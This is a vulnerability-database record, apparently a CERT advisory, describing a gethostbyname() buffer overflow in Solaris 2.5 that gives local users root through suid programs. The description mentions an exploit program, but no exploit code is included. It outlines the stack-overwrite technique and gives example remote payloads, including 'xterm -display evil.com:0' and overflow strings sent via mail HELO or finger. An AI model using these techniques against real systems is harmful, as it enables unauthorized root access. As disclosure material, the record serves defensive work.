{
  "Author": "This document was written by new-vul.",
  "CAM_AttackerAccessRequired": "20",
  "CAM_EaseOfExploitation": "10",
  "CAM_Exploitation": "5",
  "CAM_Impact": "20",
  "CAM_InternetInfrastructure": "8",
  "CAM_Population": "8",
  "CAM_ScoreCurrent": 17.4,
  "CAM_ScoreCurrentWidelyKnown": 19.8,
  "CAM_ScoreCurrentWidelyKnownExploited": 28.8,
  "CAM_WidelyKnown": "16",
  "CERTAdvisory": "",
  "CVEIDs": "",
  "CVSS_AccessComplexity": "",
  "CVSS_AccessVector": "",
  "CVSS_Authenication": "",
  "CVSS_AvailabilityImpact": "",
  "CVSS_BaseScore": "",
  "CVSS_BaseVector": "",
  "CVSS_CollateralDamagePotential": "",
  "CVSS_ConfidentialityImpact": "",
  "CVSS_EnvironmentalScore": "",
  "CVSS_EnvironmentalVector": "",
  "CVSS_Exploitability": "",
  "CVSS_IntegrityImpact": "",
  "CVSS_RemediationLevel": "",
  "CVSS_ReportConfidence": "",
  "CVSS_SecurityRequirementsAR": "",
  "CVSS_SecurityRequirementsCR": "",
  "CVSS_SecurityRequirementsIR": "",
  "CVSS_TargetDistribution": "",
  "CVSS_TemporalScore": "",
  "CVSS_TemporalVector": "",
  "DateCreated": "1999-01-05T17:25:00-05:00",
  "DateFirstPublished": "",
  "DateLastUpdated": "1999-02-15T15:22:18-05:00",
  "DatePublic": "",
  "Description": "I have found what I believe is a very serious security hole in the\ngethostbyname() function provided in the nsl library of Solaris 2.5\nand 2.5.1.  The hole allows local users to gain access to a root\nshell (exploit program provided below).  There is a good chance\nthis exploit can be modified to allow a remote attack, but such a\nmethod has not yet been found.\n\ngethostbyname() appears to have a buffer overrun problem.  Calling\ngethostbyname() on a Solaris 2.5 or 2.5.1 machine with an argument\nlarger than 8,251 characters causes a segmentation fault or bus\nerror.  This does *not* seem to happen under Solaris 2.4; some\nchange made to the NSL library between 2.4 and 2.5 seems to have\nbroken this.\n\nThe buffer overrun can be readily exploited by passing a string to\ngethostbyname() that contains assembler code to execute a shell and\noverwrites the stack's return pointer so the flow of control jumps\nto that code when the function tries to return.  (This technique\nwas described in detail in Phrack 49, and the exploit program below\nis based on their writeup.)\n\nThe implications are somewhat alarming.  Any program that accepts a\nhostname from the user without imposing a restriction on the length\nof the hostname, and resolves it using gethostbyname(), is\npotentially exploitable.  Any suid-root program fitting that\ndescription can be used to gain root privileges.  The exploit\nprogram I have provided uses /usr/bin/rlogin, but the same code\nalso gives a root shell if used in conjunction with rsh, ping, or\ntraceroute.\n\nIf a suitable daemon can be found, this same technique can probably\nalso be used as a remote exploit.  The asm code in my exploit\nprogram simply runs /bin/sh (BTW, I didn't write the shellcode\nmyself; I copied it from a similar program).  If the code is\nchanged to run something else (for example, 'xterm -display\nevil.com:0'), and a daemon can be found that will resolve hostnames\nwithout restricting their length, remote root access may be\npossible.  For example, any mail daemon might work (HELO\n<overflow_string>) or the finger daemon (finger\nkrusty@{overflow_string}@victim.com).\n\nNote that all sites running a public traceroute or ping gateway\nunder Solaris 2.5 or 2.5.1 are also potentially vulnerable, and\nprobably should disable those services until a patch is available\n(or indefinitely).\n\nSun has been notified of this bug; they told me they are already\naware of it, but a patch is not yet available.",
  "ID": "VU#9802",
  "IDNumber": "9802",
  "IPProtocol": "",
  "Impact": "A local user can gain root access.",
  "Keywords": [
    "gethostbyname",
    "libc",
    "buffer overflow",
    "root compromise",
    "network services"
  ],
  "Overview": "",
  "References": [
    "http://www.netspace.org/cgi-bin/wa?A2=ind9611C&L=bugtraq&P=R1833",
    "ftp://ftp.cert.org/pub/cert_bulletins/VB-96.18.sun"
  ],
  "Resolution": "",
  "Revision": "1",
  "SystemsAffectedPreamble": "",
  "ThanksAndCredit": "",
  "Title": "sun/gethostbyname",
  "US-CERTTechnicalAlert": "",
  "VRDA_D1_DirectReport": "",
  "VRDA_D1_Impact": "",
  "VRDA_D1_Population": "",
  "VulnerabilityCount": 1,
  "Workarounds": ""
}